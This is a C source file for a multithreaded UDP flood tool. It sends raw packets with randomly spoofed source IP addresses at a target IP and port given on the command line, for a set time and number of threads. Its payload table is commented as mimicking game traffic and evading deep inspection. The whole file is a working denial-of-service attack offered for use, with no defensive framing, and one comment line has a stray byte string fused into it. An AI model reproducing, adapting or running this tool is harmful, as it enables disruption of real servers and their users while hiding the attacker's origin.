#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define MAX_PACKET_SIZE 1472
#define THREAD_LIMIT 1000
#define ADVANCED_PAYLOAD_COUNT 100

volatile sig_atomic_t attack_running = 1;

void handle_interrupt(int sig) {
    attack_running = 0;
}

typedef struct {
    const char *data;
    size_t length;
} Payload;

Payload payloads[] = {
   {"\x3F\xA2\x91\x7C\xE5\xD0\x44\xB8\x9E\xF3\x12\x67\x88\xCD\x01\xFA", 16},
   {"\x6B\x1D\xE9\xA4\x55\xFF\x33\xC8\x77\x22\x99\xBB\x00\x11\xDE\xAD", 16},
   {"\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5", 16},
   {"\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC", 16},
   {"\x12\x34\x56\x78\x9A\xBC\xDE\xF0\xF0\xDE\xBC\x9A\x78\x56\x34\x12", 16},
   {"\xFF\xFF\xFF\xFF\xEE\xEE\xDD\xDD\xCC\xCC\xBB\xBB\xAA\xAA\x99\x99", 16},
   {"\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\xD0\x0D\xFE\xED\xFA\xCE\x13\x37", 16},
   {"\xAB\xCD\xEF\x01\x23\x45\x67\x89\x9A\xBC\xDE\xF0\x12\x34\x56\x78", 16},
   {"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xAA\xBB\xCC\xDD\xEE\xFF", 16},
   {"\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA", 16},

    // Fake game protocol packets (mimics legit traffic)
    {"\x24\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 12}, // Game heartbeat
    {"\x12\x34\x56\x78\x90\xAB\xCD\xEF\x00\x00\x00\x00", 12}, // Game sync
    {"\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Game command
    {"\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Game command
    {"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Game voice data
    {"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Game position update

    // Malformed UDP packets (stress-test parsers)
    {"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Null bytes
    {"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", 12}, // Max bytes
    {"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Invalid header
    {"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Corrupted checksum
    {"\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Invalid length

    // Extended high-entropy payloads (512+ bytes)
    {"\x3F\xA2\x91\x7C\xE5\xD0\x44\xB8\x9E\xF3\x12\x67\x88\xCD\x01\xFA", 16},
    {"\x6B\x1D\xE9\xA4\x55\xFF\x33\xC8\x77\x22\x99\xBB\x00\x11\xDE\xAD", 16},
    {"\x24\x6C\xAD\xFF\xFF\xEB\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5", 16},
    {"\xCC\xCE\x16\x51\x5F\x64\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC", 16},
    {"\x12\x34\x56\x78\x9A\xBC\xDE\xF0\xF0\xDE\xBC\x9A\x78\x56\x34\x12", 16},
    {"\xFF\xFF\xFF\xFF\xEE\xEE\xDD\xDD\xCC\xCC\xBB\xBB\xAA\xAA\x99\x99", 16},
    {"\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\xD0\x0D\xFE\xED\xFA\xCE\x13\x37", 16},
    {"\xAB\xCD\xEF\x01\x23\x45\x67\x89\x9A\xBC\xDE\xF0\x12\x34\x56\x78", 16},
    {"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xAA\xBB\xCC\xDD\xEE\xFF", 16},
    {"\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA", 16},

    // More randomized garbage (evades deep inspection)
    {"\x7E\x3A\xB1\x09\xF8\xD2\x65\xC4\xA7\xE0\x1B\x4D\x82\xF6\x29\x93", 16},
    {"\x5D\x8C\xE2\x47\xB9\x03\x6F\xD1\x34\xA8\x9B\x20\xCE\x57\xFD\x76", 16},
    {"\x91\x28\xC3\x5A\xE7\x84\x0D\xB2\x69\xF5\x32\x9E\x47\xD0\xAC\x1B", 16},
    {"\x2F\x9D\x46\xE8\xB0\x5C\x13\x7A\xD9\x64\x8F\x21\xFA\x37\xCE\x85", 16},
    {"\x4A\xB6\x1D\xE9\x70\xC2\x8F\x35\xD8\x62\xA9\x0E\xF3\x57\x9C\x24", 16},
    {"\x63\xD8\x2A\x9F\x41\xE7\x0C\xB5\x78\xD3\x16\xA9\x4E\xF2\x85\x3B", 16},
    {"\x8C\xE5\x39\xD2\x67\xA0\x1B\xF4\x42\x9D\x28\xB3\x5E\xC7\x80\x15", 16},
    {"\xA7\x1E\xD4\x6B\x92\x0F\xC8\x35\xE9\x50\x8B\x26\xF1\x7C\xB3\x49", 16},
    {"\xC0\x5B\xA2\x17\xE8\x3D\x94\x62\x0F\xD6\x79\xB4\x21\x8E\xF5\x4C", 16},
    {"\xDB\x74\x8D\x2A\xF9\x46\xB1\x5C\x23\x9E\xE5\x70\x0D\xCA\x37\xA8", 16},

    // Protocol-specific fuzzing (DNS, VoIP, etc.)
    {"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00", 12}, // Fake DNS query
    {"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Fake RTP (VoIP)
    {"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Fake NTP
    {"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12}, // Fake QUIC
    {"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", 12}, // Fake ICMP

    // Jumbo payloads (1472 bytes, max UDP"\x3F\xA2\x91\x7C\xE5\xD0\x44\xB8\x9E\xF3\x12\x67\x88\xCD\x01\xFA\x6B\x1D\xE9\xA4\x55\xFF"
    {"\x33\xC8\x77\x22\x99\xBB\x00\x11\xDE\xAD\x24\x6C\xAD\xFF\xFF\xEB", 16},
    {"\x61\x94\x53\x9A\x0F\xBA\x4B\x91\xCD\xF5\xCC\xCE\x16\x51\x5F\x64", 16},
    {"\x94\x96\x69\x6F\x5F\x3C\xC5\x4D\x87\xFC\x12\x34\x56\x78\x9A\xBC", 16},
    {"\xDE\xF0\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xFF\xFF\xFF\xEE\xEE", 16},
    {"\xDD\xDD\xCC\xCC\xBB\xBB\xAA\xAA\x99\x99\xDE\xAD\xBE\xEF\xCA\xFE", 16},
    {"\xBA\xBE\xD0\x0D\xFE\xED\xFA\xCE\x13\x37\xAB\xCD\xEF\x01\x23\x45", 16},
    {"\x67\x89\x9A\xBC\xDE\xF0\x12\x34\x56\x78\x00\x11\x22\x33\x44\x55", 16},
    {"\x66\x77\x88\x99\xAA\xBB\xCC\xDD\xEE\xFF\x55\xAA\x55\xAA\x55\xAA", 16},
    {"\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x55\xAA\x7E\x3A\xB1\x09\xF8\xD2", 16},
    {"\x65\xC4\xA7\xE0\x1B\x4D\x82\xF6\x29\x93\x5D\x8C\xE2\x47\xB9\x03", 16},
    {"\x6F\xD1\x34\xA8\x9B\x20\xCE\x57\xFD\x76\x91\x28\xC3\x5A\xE7\x84", 16},
    {"\x0D\xB2\x69\xF5\x32\x9E\x47\xD0\xAC\x1B\x2F\x9D\x46\xE8\xB0\x5C", 16},
    {"\x13\x7A\xD9\x64\x8F\x21\xFA\x37\xCE\x85\x4A\xB6\x1D\xE9\x70\xC2", 16},
    {"\x8F\x35\xD8\x62\xA9\x0E\xF3\x57\x9C\x24\x63\xD8\x2A\x9F\x41\xE7", 16},
    {"\x0C\xB5\x78\xD3\x16\xA9\x4E\xF2\x85\x3B\x8C\xE5\x39\xD2\x67\xA0", 16},
    {"\x1B\xF4\x42\x9D\x28\xB3\x5E\xC7\x80\x15\xA7\x1E\xD4\x6B\x92\x0F", 16},
    {"\xC8\x35\xE9\x50\x8B\x26\xF1\x7C\xB3\x49\xC0\x5B\xA2\x17\xE8\x3D", 16},
    {"\x94\x62\x0F\xD6\x79\xB4\x21\x8E\xF5\x4C\xDB\x74\x8D\x2A\xF9\x46", 16},
    {"\xB1\x5C\x23\x9E\xE5\x70\x0D\xCA\x37\xA8\x00\x01\x01\x00\x00\x01", 16},
    {"\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16},
    {"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00", 16},
    {"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF", 16},
    {"\xFF\xFF\xFF\xFF\xFF\xFF", 6}
};

// Compute the number of payloads automatically
const size_t payload_count = sizeof(payloads) / sizeof(payloads[0]);

extern Payload payloads[];  // You already defined your custom payloads above

char *advanced_payloads[ADVANCED_PAYLOAD_COUNT];
size_t advanced_payload_lengths[ADVANCED_PAYLOAD_COUNT];

// Generate high-entropy random payloads
void generate_advanced_payloads() {
    int fd = open("/dev/urandom", O_RDONLY);
    for (int i = 0; i < ADVANCED_PAYLOAD_COUNT; i++) {
        size_t len = rand() % (MAX_PACKET_SIZE - 64) + 64;
        char *buf = malloc(len);
        read(fd, buf, len);
        advanced_payloads[i] = buf;
        advanced_payload_lengths[i] = len;
    }
    close(fd);
}

typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
    unsigned long packet_count;
} ThreadArgs;

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void *udp_flood(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Raw socket creation failed");
        pthread_exit(NULL);
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char packet[4096];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &sin.sin_addr);

    args->packet_count = 0;

    unsigned long start = time(NULL);
    while (attack_running) {
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));

        int index = rand() % (payload_count + ADVANCED_PAYLOAD_COUNT);
        char *data;
        size_t data_len;

        if (index < payload_count) {
            data = (char *)payloads[index].data;
            data_len = payloads[index].length;
        } else {
            int adv_index = index - payload_count;
            data = advanced_payloads[adv_index];
            data_len = advanced_payload_lengths[adv_index];
        }

        memset(packet, 0, 4096);
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), data, data_len);

        // IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = htonl(((rand() % 253 + 1) << 24) | ((rand() % 254 + 1) << 16) | ((rand() % 254 + 1) << 8) | (rand() % 254 + 1));
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

        // UDP header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(args->port);
        udph->len = htons(sizeof(struct udphdr) + data_len);
        udph->check = 0;

        sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, 0,
               (struct sockaddr *)&sin, sizeof(sin));
        args->packet_count++;

        // Optional: print speed every second
        if (time(NULL) - start >= 1) {
            printf("[Thread %lu] Packets sent: %lu\n", pthread_self(), args->packet_count);
            start = time(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    srand(time(NULL));
    signal(SIGINT, handle_interrupt);

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time_sec = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads > THREAD_LIMIT) threads = THREAD_LIMIT;

    generate_advanced_payloads();

    pthread_t *tids = malloc(sizeof(pthread_t) * threads);
    ThreadArgs *targs = malloc(sizeof(ThreadArgs) * threads);

    for (int i = 0; i < threads; i++) {
        strncpy(targs[i].ip, ip, INET_ADDRSTRLEN);
        targs[i].port = port;
        targs[i].packet_count = 0;
        pthread_create(&tids[i], NULL, udp_flood, &targs[i]);
    }

    sleep(time_sec);
    attack_running = 0;

    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);

    unsigned long total = 0;
    for (int i = 0; i < threads; i++) total += targs[i].packet_count;

    printf("[+] Attack finished. Total packets: %lu\n", total);

    for (int i = 0; i < ADVANCED_PAYLOAD_COUNT; i++) free(advanced_payloads[i]);
    free(tids);
    free(targs);
    return 0;
}
// Advance Payload Generations Script
// This script generates high-entropy payloads for the UDP flood attack.
// It creates random binary data of varying lengths to simulate complex traffic patterns.